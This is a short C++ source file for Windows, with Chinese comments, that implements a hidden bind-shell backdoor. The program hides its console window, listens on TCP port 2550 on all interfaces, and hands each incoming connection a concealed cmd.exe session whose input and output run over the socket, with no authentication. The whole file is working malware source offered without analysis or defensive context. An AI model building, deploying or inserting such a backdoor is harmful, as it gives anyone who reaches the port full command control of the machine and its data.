#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
#include <winsock2.h>
#include <windows.h>

#define MasterPort 2550 // 宣告端口

int main(int argc, char *argv[])
{
    HWND hWnd = GetConsoleWindow(); // 獲取控制台視窗的句柄
    ShowWindow(hWnd, SW_HIDE); // 隱藏視窗
    WSADATA WSADa;
    sockaddr_in SockAddrIn;
    SOCKET CSocket, SSocket;
    int iAddrSize;
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFOW StartupInfo; // 使用 STARTUPINFOW（Unicode版本）
    wchar_t* szCMDPath = new wchar_t[256];  // 使用 wchar_t
    ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&StartupInfo, sizeof(STARTUPINFOW)); // 初始化為 STARTUPINFOW
    ZeroMemory(&WSADa, sizeof(WSADATA));

    // 使用 GetEnvironmentVariableW 來取得 CMD 路徑
    GetEnvironmentVariableW(L"COMSPEC", szCMDPath, 256);

    WSAStartup(0x0202, &WSADa);

    SockAddrIn.sin_family = AF_INET;
    SockAddrIn.sin_addr.s_addr = INADDR_ANY;
    SockAddrIn.sin_port = htons(MasterPort);
    CSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    bind(CSocket, (sockaddr *)&SockAddrIn, sizeof(SockAddrIn));
    listen(CSocket, 5);
    iAddrSize = sizeof(SockAddrIn);

    while ((SSocket = accept(CSocket, (sockaddr *)&SockAddrIn, &iAddrSize))) {
        StartupInfo.cb = sizeof(STARTUPINFOW);  // 修改為 STARTUPINFOW 結構體大小
        StartupInfo.wShowWindow = SW_HIDE;
        StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        StartupInfo.hStdInput = (HANDLE)SSocket;
        StartupInfo.hStdOutput = (HANDLE)SSocket;
        StartupInfo.hStdError = (HANDLE)SSocket;

        // 使用 CreateProcessW
        CreateProcessW(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &StartupInfo, &ProcessInfo);

        WaitForSingleObject(ProcessInfo.hProcess, INFINITE);  // 等待進程結束
        CloseHandle(ProcessInfo.hProcess);
        CloseHandle(ProcessInfo.hThread);
        closesocket(SSocket);
    }

    closesocket(CSocket);
    WSACleanup();

    delete[] szCMDPath;  // 記得釋放動態分配的記憶體

    return 0;
}
